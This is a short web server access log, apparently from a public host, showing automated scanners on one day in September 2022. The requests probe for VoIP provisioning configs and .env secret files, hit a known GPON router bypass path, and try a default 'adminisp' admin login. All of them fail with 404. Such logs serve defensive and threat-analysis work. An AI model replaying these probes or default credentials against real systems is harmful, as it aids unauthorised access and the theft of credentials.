201.231.172.92 - - [11/Sep/2022:15:22:30 +0000] "GET / HTTP/1.0" 200 32 "-" "-"
20.163.63.5 - - [11/Sep/2022:15:36:54 +0000] "GET /000000000000.cfg HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
20.163.63.5 - - [11/Sep/2022:15:36:54 +0000] "GET /cfg/000000000000.cfg HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
20.163.63.5 - - [11/Sep/2022:15:36:54 +0000] "GET /pps/aastra/000000000000.cfg HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
20.163.63.5 - - [11/Sep/2022:15:36:54 +0000] "GET /polycom/000000000000.cfg HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
20.163.63.5 - - [11/Sep/2022:15:36:54 +0000] "GET /prov/000000000000.cfg HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
20.163.63.5 - - [11/Sep/2022:15:36:54 +0000] "GET /pv/000000000000.cfg HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
20.163.63.5 - - [11/Sep/2022:15:36:55 +0000] "GET /dms/000000000000.cfg HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
20.163.63.5 - - [11/Sep/2022:15:36:55 +0000] "GET /aastra/000000000000.cfg HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
20.163.63.5 - - [11/Sep/2022:15:36:55 +0000] "GET /provision/000000000000.cfg HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
135.125.244.48 - - [11/Sep/2022:15:45:06 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:15:45:07 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
165.227.211.106 - - [11/Sep/2022:16:16:37 +0000] "GET / HTTP/1.0" 200 32 "-" "-"
135.125.244.48 - - [11/Sep/2022:17:01:34 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:17:01:34 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
27.47.3.76 - - [11/Sep/2022:18:03:55 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 196 "-" "Hello, World"
135.125.244.48 - - [11/Sep/2022:18:09:09 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [11/Sep/2022:18:09:10 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
210.89.63.248 - - [11/Sep/2022:19:07:06 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 196 "-" "-"
